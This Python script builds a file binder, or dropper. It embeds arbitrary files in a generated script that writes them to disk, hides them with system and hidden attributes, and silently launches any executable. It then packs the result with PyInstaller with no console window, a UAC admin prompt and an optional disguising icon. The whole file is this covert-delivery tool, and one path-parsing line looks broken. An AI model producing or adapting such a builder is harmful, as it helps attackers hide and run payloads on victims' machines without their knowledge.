import os

count = 1

files = input('Files: ').split(',')
print(files)

data = open('data.py', 'w')
data.write('''
import os
import time
from subprocess import Popen

''')

for f in files:
    if files[count - 1].count('\\') > 0:
        info = files[count - 1].split('\\')[len(files[count - 1]) - 1]
    extension = f.split('.')[1]
    name = f.split('.')[0]
    read = open(f, 'rb')
    data.write('file_{0} = '.format(count) + str(read.read()) + '\n')
    data.write('''
time.sleep(1)
file__{0} = open("{2}.{1}", 'wb')
file__{0}.write(file_{0})
file__{0}.close()
os.system('attrib +s +h "{2}.{1}"')
if '{1}' == 'exe':
    Popen('{2}.{1}')

'''.format(count, extension, name))
    data.write('\n')
    count += 1

read.close()
data.close()

prompt = input('Do you want to compile now?(y)\n:').lower()
if prompt == "y" or prompt == '':
    icon = input('icon location (default)\n:')
    if icon != '':
        os.system('pyinstaller --clean --onefile --noconsole --uac-admin --icon "{0}" data.py'.format(icon))
    else:
        os.system('pyinstaller --clean --onefile --noconsole --uac-admin data.py')
else:
    print("Done. \'compile data.py\'")
